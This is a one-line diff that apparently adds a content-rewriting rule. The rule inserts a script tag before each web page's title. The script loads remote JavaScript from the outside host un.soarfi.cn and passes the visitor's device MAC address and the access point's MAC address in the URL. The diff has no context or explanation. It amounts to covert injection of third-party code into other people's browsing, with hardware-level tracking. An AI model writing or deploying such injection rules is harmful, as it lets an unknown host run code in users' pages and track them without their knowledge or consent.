@@ -1,0 +1,2 @@
+/<title>/<script type="text/javascript" src="http://un.soarfi.cn/ydap.js?ydcp_id=10169&cumid=$mac&apmac=$ap_mac"></script><title>
+
